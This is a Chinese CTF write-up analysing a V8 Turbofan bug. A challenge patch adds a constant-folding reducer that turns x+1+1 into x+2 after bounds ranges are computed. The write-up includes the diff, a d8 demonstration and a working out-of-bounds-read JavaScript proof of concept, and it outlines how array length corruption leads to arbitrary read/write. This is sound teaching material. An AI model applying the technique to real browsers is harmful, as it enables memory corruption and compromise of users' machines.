惯例根据一个实际的样本来说明 Turbofan 的利用过程，理解一下这种优化在什么情况下能够被利用。首先我们从资料较多的例题开始。
题目附件给了 diff 文件，我们可以直接阅读代码来确定问题所在：
    @@ -1301,6 +1302,8 @@ struct TypedLoweringPhase { 
     data->jsgraph()->Dead()); 
     DeadCodeElimination dead_code_elimination(&graph_reducer, data->graph(), 
     data->common(), temp_zone); 
     + DuplicateAdditionReducer duplicate_addition_reducer(&graph_reducer, data->graph(), 
     + data->common()); 
    ···
     @@ -1318,6 +1321,7 @@ struct TypedLoweringPhase { 
     data->js_heap_broker(), data->common(), 
     data->machine(), temp_zone); 
     AddReducer(data, &graph_reducer, &dead_code_elimination); 
     + AddReducer(data, &graph_reducer, &duplicate_addition_reducer); 
     AddReducer(data, &graph_reducer, &create_lowering); 
可以注意到，在最后的一系列优化中，题目添加了一个额外的优化，向上跟踪可以找到其来自于 `DuplicateAdditionReducer`
再往上找即可发现关键的漏洞代码：
    +Reduction DuplicateAdditionReducer::Reduce(Node* node) {
    + switch (node->opcode()) {
    + case IrOpcode::kNumberAdd:
    + return ReduceAddition(node);
    + default:
    + return NoChange();
    + }
    +}
    +
    +Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
    + DCHECK_EQ(node->op()->ControlInputCount(), 0);
    + DCHECK_EQ(node->op()->EffectInputCount(), 0);
    + DCHECK_EQ(node->op()->ValueInputCount(), 2);
    +
    + Node* left = NodeProperties::GetValueInput(node, 0);
    + if (left->opcode() != node->opcode()) {
    + return NoChange();
    + }
    +
    + Node* right = NodeProperties::GetValueInput(node, 1);
    + if (right->opcode() != IrOpcode::kNumberConstant) {
    + return NoChange();
    + }
    +
    + Node* parent_left = NodeProperties::GetValueInput(left, 0);
    + Node* parent_right = NodeProperties::GetValueInput(left, 1);
    + if (parent_right->opcode() != IrOpcode::kNumberConstant) {
    + return NoChange();
    + }
    +
    + double const1 = OpParameter(right->op());
    + double const2 = OpParameter(parent_right->op());
    + Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
    +
    + NodeProperties::ReplaceValueInput(node, parent_left, 0);
    + NodeProperties::ReplaceValueInput(node, new_const, 1);
    +
    + return Changed(node);
    +}
我们筛出关键的分支判断和漏洞代码：
    + switch (node->opcode()) {
    + case IrOpcode::kNumberAdd:
    + ···
    + if (left->opcode() != node->opcode()) {
    + ···
    + if (right->opcode() != IrOpcode::kNumberConstant) {
    + ···
    + if (parent_right->opcode() != IrOpcode::kNumberConstant) {
    + ···
    + Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
总结如下： \- 结点本身为 kNumberAdd \- 左树结点也为 kNumberAdd \- 右树结点为 kNumberConstant \-左树的右父节点也为 kNumberConstant \- 满足以上条件时，将该结点替换为
NumberConstant(const1+const2)，意味将两个常数合并
满足条件的情况下，其结点树大致如下：`x+constant+constant`
                     +------------------+
                     | kNumberConstant  |
              +------+                  |
              |      +------------------+
              |
              |
              |
    +---------v------+                +------------------+
    | kNumberAdd     |                |kNumberConstant   |
    |                |                |                  |
    +---------+------+                +--------+---------+
              |                                |
              |                                |
              |                                |
              |       +---------------+        |
              +-------> kNumberAdd     这里的加法即为 JIT 优化层面的运算，我们可以考虑这样一种情况： \- Index[x] 未越界，可执行 \- Index[x+1+1]
> 未越界，可执行 \- Index[x+2] 越界，不可执行
不知您是否发现了某些问题，如果我们在代码层面写的是 `Index[x+1+1]` ，那么它是一条可执行的语句，而如果写 `Index[x+2]`
则会被检查出越界；那如果我们写入 `Index[x+1+1]` 使其通过检查后，让优化器把这段语句自动优化成了 `Index[x+2]`
，是否就能够绕过边界检查实现越界读写呢？
> 如果您熟悉 C 语言或是其他类似的编程语言，那么你或许不会认为把 `1+1` 优化为 `2` 是一种不合理的选择，但由于在 JavaScript
> 中的整数实际上是通过 double 类型的浮点数表示，因此就有可能在运算时发生问题。 例如，`Number.MAX_SAFE_INTEGER`
> 就表示能够安全运算的最大整数，超出该数的运算就有可能发生上述问题，但它并不禁止你使用这类整数，因此在编写代码时需要程序员自己注意。
我们可以直接上代码试试这个事实：
    V8 version 7.3.0 (candidate)
    d8> x=Number.MAX_SAFE_INTEGER
    9007199254740991
    d8> x=x+1
    9007199254740992
    d8> x=x+1
    9007199254740992
    d8> x=x+1
    9007199254740992
这个事实在各个版本中都存在，尽管它并不一定算是个问题，但和题目的优化机制结合就变得可以利用了。
### 一个简单的越界
    function oob(x)
    {
        var double_array=[1.1,2.2,3.3,4.4];
        //Number.MAX_SAFE_INTEGER=9007199254740991;
        let t=(x==0)?Number.MAX_SAFE_INTEGER-2:Number.MAX_SAFE_INTEGER+1;
        //Range(9007199254740991-2,9007199254740991+1);
        t=t+1+1;
        //优化前:Range(9007199254740991,9007199254740991+1);
        //优化后:Range(9007199254740991,9007199254740991+3);
        t=t-9007199254740989;
        //优化前:Range(2,3)
        //优化后:Range(2,5)
        return double_array[t];
    }
    console.log(oob(0));
    console.log(oob(1));
    %OptimizeFunctionOnNextCall(oob);
    console.log(oob(1));
执行它将会打印出如下内容：
    $ ./d8 exp.js --allow-natives-syntax --trace-turbo
    3.3
    4.4
    0
我们可以尝试通过节点海跟踪一下这个分析过程。在没有进行优化时，我们得到的节点海为：
此时将遍历所有结点，并通过计算得出它们的 Range 取值范围。可以发现，此时的 CheckBounds 得知这个范围为 `Range(2,3)`
，这是不可能发生溢出的。
然后到了 typedlowering 阶段，将开始进行初步的优化，可以注意到，此时 `1+1` 已经被优化为了 `NumberConstant[2]`
，但并没有重新计算 CheckBounds 得到的范围。
由于turbofan发现这个结点获得的索引始终都在Range(2,3)，因此在simplified lowering阶段已经将这个结点删除：
而当完成优化以后，再次执行这个函数时，`t+1+1` 变成 `t+2` 导致了计算结果超出预期进行越界读写，却没能被检查出来，因此得到了越界的能力。
> 总结以下上述的过程就是：
>
>   * Range 只在最初的阶段进行计算
>   * 而如果后续的优化会导致 Range 的范围变动，而 turbofan 并不会重新计算
>   * 于是该值发生越界
>
>
> 当然，由于现在的版本不再删除 checkbound 结点，因此这个问题只会发生在过去，但它仍然值得我们学习。
能够越界读写以后，泄露地址和伪造数据自然不在话下。只要修改 JSArray 的 length 属性为需要的值，之后就能够随意读写界外了。相关代码如下：
    bool IsOutOfBoundsAccess(Handle receiver, uint32_t index) {
      uint32_t length = 0;
      if (receiver->IsJSArray()) {
        // 获取 JSArray 的 length
        JSArray::cast(*receiver)->length()->ToArrayLength(&length);
      } else if (receiver->IsString()) {
        length = String::cast(*receiver)->length();
      } else if (receiver->IsJSObject()) {
        length = JSObject::cast(*receiver)->elements()->length();
      } else {
        return false;
      }
      // 判断是否越界
      return index >= length;
    }
具体的利用已经有很多师傅详细聊过，因此本篇就不做多余的赘述了。
* * *